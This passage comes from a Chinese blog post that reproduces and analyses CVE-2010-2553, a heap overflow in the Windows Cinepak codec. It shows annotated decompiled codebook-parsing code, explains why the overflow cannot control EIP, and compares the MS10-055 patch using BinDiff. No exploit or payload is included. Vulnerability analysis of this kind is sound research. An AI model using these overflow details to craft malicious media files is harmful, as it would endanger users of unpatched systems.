class="keyword">char</span> v46; <span class="comment">// al</span></span><br><span class="line">  __int16 v47; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v48; <span class="comment">// al</span></span><br><span class="line">  __int16 v49; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v50; <span class="comment">// al</span></span><br><span class="line">  __int16 v51; <span class="comment">// cx</span></span><br><span class="line">  <span class="keyword">char</span> v52; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v53; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v54; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">char</span> v55; <span class="comment">// dl</span></span><br><span class="line">  _BYTE *v56; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> v57; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v58; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> v59; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v61; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v62; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v63; <span class="comment">// [esp+14h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v64; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> num; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  CVID_Chunk_ID_Ptr1 = (<span class="keyword">unsigned</span> __int8 *)CVID_Chunk_ID_Ptr;</span><br><span class="line">  LOBYTE(v5) = <span class="number">0</span>;</span><br><span class="line">  HIBYTE(v5) = *(_WORD *)(CVID_Chunk_ID_Ptr + <span class="number">2</span>);<span class="comment">// Size of chunk data HByte,0x0600</span></span><br><span class="line">  v6 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)*(<span class="keyword">unsigned</span> __int16 *)(CVID_Chunk_ID_Ptr + <span class="number">2</span>) &gt;&gt; <span class="number">8</span>;<span class="comment">// 0x0406-&gt;0x0004,Size of chunk data LByte</span></span><br><span class="line">  v7 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                   <span class="comment">// Chunk data</span></span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8 *)(CVID_Chunk_ID_Ptr + <span class="number">4</span>);<span class="comment">// Chunk data</span></span><br><span class="line">  v64 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                  <span class="comment">// Chunk data</span></span><br><span class="line">  v9 = (v6 | v5) - <span class="number">4</span>;                           <span class="comment">// v9 = Size of chunk data - 4</span></span><br><span class="line">  v63 = CVID_Chunk_ID_Ptr + <span class="number">4</span>;                  <span class="comment">// Chunk data</span></span><br><span class="line">  CVID_Chunk_ID_Ptr = v9;</span><br><span class="line">  <span class="keyword">if</span> ( v9 )                                     <span class="comment">// 判断chunk data长度是否为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = *CVID_Chunk_ID_Ptr1;                   <span class="comment">// CVID_Chunk_ID_HByte</span></span><br><span class="line">    <span class="keyword">switch</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x20</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x22</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">6</span> )                          <span class="comment">// chunk data长度是否大于等于6字节(一个codebook vector的大小)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v10 = (<span class="keyword">char</span> *)(Heap_UserPtr + <span class="number">2</span>);</span><br><span class="line">          <span class="comment">// 6字节codebook vector转换为16字节数据,堆缓冲区保存解压后的数据</span></span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">256</span> )                   <span class="comment">// codebooks最多包含256个codebook vector</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            LOWORD(v7) = (<span class="keyword">char</span>)v8[<span class="number">5</span>];           <span class="comment">// 第6字节数据</span></span><br><span class="line">            v11 = v8[<span class="number">4</span>];                        <span class="comment">// 第5字节数据</span></span><br><span class="line">            v12 = v11;                          <span class="comment">// 第5字节数据</span></span><br><span class="line">            v64 = <span class="number">2</span> * v7;                       <span class="comment">// 第6字节数据*2</span></span><br><span class="line">            v13 = -v7 - v11 / <span class="number">2</span>;                <span class="comment">// -第6字节数据-第5字节数据/2</span></span><br><span class="line">            v14 = *v8;                          <span class="comment">// 第1字节数据</span></span><br><span class="line">            v12 *= <span class="number">2</span>;                           <span class="comment">// 第5字节数据*2</span></span><br><span class="line">            Heap_UserPtr = v13;</span><br><span class="line">            v15 = GetBounding24(v14 + v12 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v16 = Heap_UserPtr;</span><br><span class="line">            *(v10 - <span class="number">2</span>) = v15;                   <span class="comment">// 堆缓冲区第1字节</span></span><br><span class="line">            v17 = GetBounding24(*v8 + v16 + <span class="number">64</span>);<span class="comment">// 第1字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v18 = v64;</span><br><span class="line">            *(v10 - <span class="number">1</span>) = v17;                   <span class="comment">// 堆缓冲区第2字节</span></span><br><span class="line">            *v10 = GetBounding24(*v8 + v18 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第6字节数据*2+0x40,堆缓冲区第3字节</span></span><br><span class="line">            v19 = GetBounding24(v8[<span class="number">1</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v20 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">2</span>] = v19;                       <span class="comment">// 堆缓冲区第5字节</span></span><br><span class="line">            v21 = GetBounding24(v8[<span class="number">1</span>] + v20 + <span class="number">64</span>);<span class="comment">// 第2字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v22 = v64;</span><br><span class="line">            v10[<span class="number">3</span>] = v21;                       <span class="comment">// 堆缓冲区第6字节</span></span><br><span class="line">            v10[<span class="number">4</span>] = GetBounding24(v8[<span class="number">1</span>] + v22 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第6字节数据*2+0x40,堆缓冲区第7字节</span></span><br><span class="line">            v23 = GetBounding24(v8[<span class="number">2</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v24 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">6</span>] = v23;                       <span class="comment">// 堆缓冲区第9字节</span></span><br><span class="line">            v25 = GetBounding24(v8[<span class="number">2</span>] + v24 + <span class="number">64</span>);<span class="comment">// 第3字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v26 = v64;</span><br><span class="line">            v10[<span class="number">7</span>] = v25;                       <span class="comment">// 堆缓冲区第10字节</span></span><br><span class="line">            v10[<span class="number">8</span>] = GetBounding24(v8[<span class="number">2</span>] + v26 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第6字节数据*2+0x40,堆缓冲区第11字节</span></span><br><span class="line">            v27 = GetBounding24(v8[<span class="number">3</span>] + v12 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第5字节数据*2+0x40</span></span><br><span class="line">            v28 = Heap_UserPtr;</span><br><span class="line">            v10[<span class="number">10</span>] = v27;                      <span class="comment">// 堆缓冲区第13字节</span></span><br><span class="line">            v29 = GetBounding24(v8[<span class="number">3</span>] + v28 + <span class="number">64</span>);<span class="comment">// 第4字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">            v30 = v64;</span><br><span class="line">            v10[<span class="number">11</span>] = v29;                      <span class="comment">// 堆缓冲区第14字节</span></span><br><span class="line">            LOBYTE(v6) = GetBounding24(v8[<span class="number">3</span>] + v30 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第6字节数据*2+0x40</span></span><br><span class="line">            v10[<span class="number">12</span>] = v6;                       <span class="comment">// 堆缓冲区第15字节</span></span><br><span class="line">            CVID_Chunk_ID_Ptr -= <span class="number">6</span>;             <span class="comment">// chunk data长度-6</span></span><br><span class="line">            v8 += <span class="number">6</span>;                            <span class="comment">// Chunk data指针+6</span></span><br><span class="line">            ++num;                              <span class="comment">// codebook vector计数器</span></span><br><span class="line">            v10 += <span class="number">16</span>;                          <span class="comment">// 堆缓冲区指针+16</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x21</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x23</span>:</span><br><span class="line">        <span class="comment">// 4字节Update Flags,[Update Flags中1的个数个codebook vector],4字节Update Flags,[Update Flags中1的个数个codebook vector]...</span></span><br><span class="line">        v61 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">6</span> )                          <span class="comment">// chunk data长度是否大于6字节(一个codebook vector的大小)</span></span><br><span class="line">        &#123;</span><br><span class="line">          v31 = (<span class="keyword">char</span> *)(Heap_UserPtr + <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )                 <span class="comment">// codebooks最多包含256个codebook vector</span></span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v61 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v61 )                          <span class="comment">// v61第一次为0x0,第二次为0x80000000,第三次为0x40000000,第四次为0x20000000</span></span><br><span class="line">            &#123;</span><br><span class="line">              v6 = v61 &amp; v62;                   <span class="comment">// v62为swAdvance2()读出来的大端形式的数据</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 0x0,chunk data指针的指针,chunk data长度指针</span></span><br><span class="line">              v6 = swAdvance2(&amp;v61, (_BYTE **)&amp;v64, &amp;CVID_Chunk_ID_Ptr);<span class="comment">// chunk data的前四字节为一个flag</span></span><br><span class="line">              v8 = (<span class="keyword">unsigned</span> __int8 *)v64;      <span class="comment">// chunk data指针</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// chunk data四字节数据某一位不为0,chunk data长度&gt;=6</span></span><br><span class="line">            <span class="keyword">if</span> ( v6 &amp;&amp; CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">// 从chunk data+4开始,解析codebook vector</span></span><br><span class="line">              LOWORD(v7) = (<span class="keyword">char</span>)v8[<span class="number">5</span>];         <span class="comment">// 第6字节数据</span></span><br><span class="line">              v32 = v8[<span class="number">4</span>];                      <span class="comment">// 第5字节数据</span></span><br><span class="line">              v33 = v32;                        <span class="comment">// 第5字节数据</span></span><br><span class="line">              v64 = <span class="number">2</span> * v7;                     <span class="comment">// 第6字节数据*2</span></span><br><span class="line">              v34 = -v7 - v32 / <span class="number">2</span>;              <span class="comment">// -第6字节数据-第5字节数据/2</span></span><br><span class="line">              v35 = *v8;                        <span class="comment">// 第1字节数据</span></span><br><span class="line">              v33 *= <span class="number">2</span>;                         <span class="comment">// 第5字节数据*2</span></span><br><span class="line">              Heap_UserPtr = v34;</span><br><span class="line">              v36 = GetBounding24(v35 + v33 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v37 = Heap_UserPtr;</span><br><span class="line">              *(v31 - <span class="number">2</span>) = v36;                 <span class="comment">// 堆缓冲区第0x10*num+1字节</span></span><br><span class="line">              v38 = GetBounding24(*v8 + v37 + <span class="number">64</span>);<span class="comment">// 第1字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v39 = v64;</span><br><span class="line">              *(v31 - <span class="number">1</span>) = v38;                 <span class="comment">// 堆缓冲区第0x10*num+2字节</span></span><br><span class="line">              *v31 = GetBounding24(*v8 + v39 + <span class="number">64</span>);<span class="comment">// 第1字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+3字节</span></span><br><span class="line">              v40 = GetBounding24(v8[<span class="number">1</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v41 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">2</span>] = v40;                     <span class="comment">// 堆缓冲区第0x10*num+5字节</span></span><br><span class="line">              v42 = GetBounding24(v8[<span class="number">1</span>] + v41 + <span class="number">64</span>);<span class="comment">// 第2字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v43 = v64;</span><br><span class="line">              v31[<span class="number">3</span>] = v42;                     <span class="comment">// 堆缓冲区第0x10*num+6字节</span></span><br><span class="line">              v31[<span class="number">4</span>] = GetBounding24(v8[<span class="number">1</span>] + v43 + <span class="number">64</span>);<span class="comment">// 第2字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+7字节</span></span><br><span class="line">              v44 = GetBounding24(v8[<span class="number">2</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v45 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">6</span>] = v44;                     <span class="comment">// 堆缓冲区第0x10*num+9字节</span></span><br><span class="line">              v46 = GetBounding24(v8[<span class="number">2</span>] + v45 + <span class="number">64</span>);<span class="comment">// 第3字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v47 = v64;</span><br><span class="line">              v31[<span class="number">7</span>] = v46;                     <span class="comment">// 堆缓冲区第0x10*num+10字节</span></span><br><span class="line">              v31[<span class="number">8</span>] = GetBounding24(v8[<span class="number">2</span>] + v47 + <span class="number">64</span>);<span class="comment">// 第3字节数据+第6字节数据*2+0x40,堆缓冲区第0x10*num+11字节</span></span><br><span class="line">              v48 = GetBounding24(v8[<span class="number">3</span>] + v33 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第5字节数据*2+0x40</span></span><br><span class="line">              v49 = Heap_UserPtr;</span><br><span class="line">              v31[<span class="number">10</span>] = v48;                    <span class="comment">// 堆缓冲区第0x10*num+13字节</span></span><br><span class="line">              v50 = GetBounding24(v8[<span class="number">3</span>] + v49 + <span class="number">64</span>);<span class="comment">// 第4字节数据+(-第6字节数据-第5字节数据/2)+0x40</span></span><br><span class="line">              v51 = v64;</span><br><span class="line">              v31[<span class="number">11</span>] = v50;                    <span class="comment">// 堆缓冲区第0x10*num+14字节</span></span><br><span class="line">              LOBYTE(v6) = GetBounding24(v8[<span class="number">3</span>] + v51 + <span class="number">64</span>);<span class="comment">// 第4字节数据+第6字节数据*2+0x40</span></span><br><span class="line">              v31[<span class="number">12</span>] = v6;                     <span class="comment">// 堆缓冲区第0x10*num+15字节</span></span><br><span class="line">              CVID_Chunk_ID_Ptr -= <span class="number">6</span>;           <span class="comment">// chunk data长度-6</span></span><br><span class="line">              v8 += <span class="number">6</span>;                          <span class="comment">// Chunk data指针+6</span></span><br><span class="line">              v64 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8;           <span class="comment">// chunk data指针</span></span><br><span class="line">            &#125;</span><br><span class="line">            ++num;                              <span class="comment">// codebook vector计数器</span></span><br><span class="line">            v31 += <span class="number">16</span>;                          <span class="comment">// 堆缓冲区指针+16</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">6</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x24</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x26</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v6 = Heap_UserPtr + <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v52 = *(_BYTE *)v7;</span><br><span class="line">            CVID_Chunk_ID_Ptr -= <span class="number">4</span>;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">1</span>) = v52;</span><br><span class="line">            *(_BYTE *)v6 = v52;</span><br><span class="line">            *(_BYTE *)(v6 - <span class="number">1</span>) = v52;</span><br><span class="line">            v53 = *(_BYTE *)(v7 + <span class="number">1</span>);</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">5</span>) = v53;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">4</span>) = v53;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">3</span>) = v53;</span><br><span class="line">            v54 = *(_BYTE *)(v7 + <span class="number">2</span>);</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">9</span>) = v54;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">8</span>) = v54;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">7</span>) = v54;</span><br><span class="line">            v55 = *(_BYTE *)(v7 + <span class="number">3</span>);</span><br><span class="line">            v7 += <span class="number">4</span>;</span><br><span class="line">            ++num;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">13</span>) = v55;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">12</span>) = v55;</span><br><span class="line">            *(_BYTE *)(v6 + <span class="number">11</span>) = v55;</span><br><span class="line">            v6 += <span class="number">16</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x25</span>:</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x27</span>:</span><br><span class="line">        v61 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 &gt;= <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v56 = (_BYTE *)(Heap_UserPtr + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( num &gt;= <span class="number">0x100</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v61 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ( v61 )</span><br><span class="line">            &#123;</span><br><span class="line">              v6 = v61 &amp; v62;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v6 = swAdvance2(&amp;v61, (_BYTE **)&amp;v63, &amp;CVID_Chunk_ID_Ptr);</span><br><span class="line">              v7 = v63;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v6 &amp;&amp; CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              v57 = *(_BYTE *)v7;</span><br><span class="line">              CVID_Chunk_ID_Ptr -= <span class="number">4</span>;</span><br><span class="line">              v56[<span class="number">1</span>] = v57;</span><br><span class="line">              *v56 = v57;</span><br><span class="line">              *(v56 - <span class="number">1</span>) = v57;</span><br><span class="line">              v58 = *(_BYTE *)(v7 + <span class="number">1</span>);</span><br><span class="line">              v56[<span class="number">5</span>] = v58;</span><br><span class="line">              v56[<span class="number">4</span>] = v58;</span><br><span class="line">              v56[<span class="number">3</span>] = v58;</span><br><span class="line">              v59 = *(_BYTE *)(v7 + <span class="number">2</span>);</span><br><span class="line">              v56[<span class="number">9</span>] = v59;</span><br><span class="line">              v56[<span class="number">8</span>] = v59;</span><br><span class="line">              v56[<span class="number">7</span>] = v59;</span><br><span class="line">              LOBYTE(v6) = *(_BYTE *)(v7 + <span class="number">3</span>);</span><br><span class="line">              v7 += <span class="number">4</span>;</span><br><span class="line">              v56[<span class="number">13</span>] = v6;</span><br><span class="line">              v56[<span class="number">12</span>] = v6;</span><br><span class="line">              v56[<span class="number">11</span>] = v6;</span><br><span class="line">              v63 = v7;</span><br><span class="line">            &#125;</span><br><span class="line">            ++num;</span><br><span class="line">            v56 += <span class="number">16</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( CVID_Chunk_ID_Ptr &gt;= <span class="number">4</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;所以这部分数据是<code>可以控制的</code>。但是，由于每次<code>堆块内存数据复制</code>时的<code>复制数据长度</code>(ecx)固定为<code>0x800*4=0x2000字节</code>，而超出<code>0x6000字节</code>堆块数据区域之后的<code>0x2000字节内存</code>包含一段<code>内存状态</code>(State)为<code>MEM_RESERVE</code>的内存，会造成<code>内存访问异常</code>，所以<code>无法控制EIP</code>。</p>
<h2 id="0x50-漏洞修复"><a href="#0x50-漏洞修复" class="headerlink" title="0x50 漏洞修复"></a>0x50 漏洞修复</h2><p>&emsp;&emsp;我们可以从<code>以下链接</code>找到此漏洞的<code>相关信息</code>，以及<code>漏洞补丁</code>的下载链接：</p>
<blockquote>
<ul>
<li>1、<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">Microsoft 安全公告 MS10-055 - 严重</a></li>
<li>2、<a href="https://support.microsoft.com/zh-cn/topic/ms10-055-vulnerability-in-cinepak-codec-could-allow-remote-code-execution-db8b5255-4e65-b629-ad2e-e1f890a63d8f" target="_blank" rel="noopener">MS10-055: Vulnerability in Cinepak codec could allow remote code execution</a></li>
<li>3、<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=ms10-055" target="_blank" rel="noopener">Microsoft Update Catalog - MS10-055</a></li>
</ul>
</blockquote>
<p>&emsp;&emsp;根据<code>测试环境</code>，下载对应的<code>漏洞补丁</code>。我这里下载的是<code>Windows XP</code>环境下的补丁。补丁<code>安装前</code>和<code>安装后</code>，<code>iccvid.dll</code>模块的版本如下：</p>
<blockquote>
<ul>
<li>安装前：1.10.0.12</li>
<li>安装后：1.10.0.13</li>
</ul>
</blockquote>
<p>&emsp;&emsp;书中用的是<code>Turbodiff</code>进行<code>补丁比较</code>的，它是<code>IDA</code>的一款<code>插件</code>。由于其长期<code>未更新</code>，且支持的IDA版本<code>较低</code>，所以这里还是用<code>BinDiff</code>来进行<code>补丁比较</code>。结果如下：</p>
<div align="left"><img src="/resources/2021/CVE-2010-2553/补丁前后关键函数对比图.png" width="80%" height="60%" alt="补丁前后关键函数对比图"></div>

<p>&emsp;&emsp;上图中的<code>红框部分</code>是<code>补丁代码</code>的关键部分，最初<code>esi</code>存储的是指向样本中<code>cinepak_codec_data1</code>的指针，通过<code>固定的偏移</code>，将<code>Number of coded strips</code>读出，存放在<code>局部变量[ebp-0x8]</code>中。然后将其<code>与3做比较</code>，如果<code>Number of coded strips&gt;3</code>，则将<code>Number of coded strips</code>修改为<code>3</code>，反之，则<code>不进行</code>任何操作。这段<code>补丁代码</code>主要是对<code>Number of coded strips</code>进行限制，只允许其<code>小于等于3</code>，若超过则<code>强制修改为3</code>。</p>
<p>&emsp;&emsp;一个<code>Frame</code>可能包含<code>多个Strip</code>，但是<code>第一个</code>必须是<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>。因为<code>第一次</code>进行堆块内存数据复制时，<code>源地址</code>(esi)为<code>堆块数据区域首地址</code>，<code>目的地址</code>(edi)为<code>堆块数据区域首地址+0x2000</code>，而堆块数据区域的<code>前0x2000字节</code>数据，正是由<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>解码得来的。当<code>Number of coded strips = 3</code>时，除去<code>“Strip CVID ID”</code>为<code>0x1000</code>的<code>Strip</code>外，还有2个是<code>“Strip CVID ID”</code>为<code>0x1100</code>的<code>Strip</code>。这样，只会进行<code>两次</code>堆块内存数据复制，所以<code>不会</code>造成堆溢出。</p>
<h2 id="0x60-Reference"><a href="#0x60-Reference" class="headerlink" title="0x60 Reference"></a>0x60 Reference</h2><blockquote>
<ul>
<li>1.漏洞战争:软件漏洞分析精要; 3.4 CVE-2010-2553,Microsoft Cinepak Codec CVDecompress函数堆溢出漏洞</li>
<li>2.0day安全:软件漏洞分析技术; 第5章、堆溢出利用</li>
<li>3.<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2010/ms10-055" target="_blank" rel="noopener">Microsoft 安全公告 MS10-055 - 严重</a></li>
<li>4.<a href="https://multimedia.cx/mirror/cinepak.txt" target="_blank" rel="noopener">Cinepak (CVID) stream format for AVI and QT</a></li>
<li>5.<a href="https://wiki.multimedia.cx/index.php?title=Cinepak" target="_blank" rel="noopener">MultiMedia Wiki - Cinepak</a></li>
<li>6.<a href="https://zhuanlan.zhihu.com/p/137836227" target="_blank" rel="noopener">知乎 - 刻意练习FFmpeg系列：颜色和像素</a></li>
<li>7.<a href="https://www.cnblogs.com/Ox9A82/p/5715673.html" target="_blank" rel="noopener">Ox9A82 - CVE-2010-2553 Microsoft Windows Cinepak编码解码器解压缩漏洞分析</a></li>
<li>8.<a href="https://www.cnblogs.com/csnd/p/11800534.html" target="_blank" rel="noopener">CVE-2010-2553：Microsoft Cinepak Codec CVDecompress 函数堆溢出漏洞调试分析</a></li>
<li>9.<a href="https://www.cnblogs.com/kissdodog/p/3730598.html" target="_blank" rel="noopener">Windbg 内存命令 《第四篇》</a></li>
<li>10.<a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/17/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2010-2553/" target="_blank" rel="noopener">漏洞战争-cve-2010-2553</a></li>
</ul>
</blockquote>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2021/01/10/CVE-2010-2553复现与分析/">CVE-2010-2553复现与分析</a></p>
        <p><span>文章作者:</span><a href="/" title="访问 Sp4n9x 的个人博客">Sp4n9x</a></p>
        <p><span>发布时间:</span>2021-01-10, 00:00</p>
        <p><span>最后更新:</span>2021-02-16, 20:54</p>
        
            <p>
                <span>更新历史:</span><i class="fa fa-github"></i>
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2021-01-10.CVE-2010-2553复现与分析.md" title="顺序查看文章各部分修改记录" target = "_blank">Blame</a>,
                <a href="https://github.com/Sp4n9x/blog_backup/blob/master/_posts/2021-01-10.CVE-2010-2553复现与分析.md" title="查看文章有关更新记录" target = "_blank">History</a><span class="raw">文本模式:</span><i class="fa fa-file-text-o"></i>
                <a href="https://raw.githubusercontent.com/Sp4n9x/blog_backup/blob/master/_posts/2021-01-10.CVE-2010-2553复现与分析.md" title="查看 & 下载文章 Markdown 原始文本" target = "_blank"> .md Raw</a>
            </p>
        
        <p>
            <span>原始链接:</span><a class="post-url" href="/2021/01/10/CVE-2010-2553复现与分析/" title="CVE-2010-2553复现与分析">http://sp4n9x.github.io/2021/01/10/CVE-2010-2553复现与分析/</a>
            <span class="copy-path" data-clipboard-text="原文: http://sp4n9x.github.io/2021/01/10/CVE-2010-2553复现与分析/　　作者: Sp4n9x" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>

    
    <nav id="article-nav">
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2020/12/30/AVI文件格式分析/">
                    AVI文件格式分析
                </a>
            </div>
        
    </nav>

  
</article>






    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
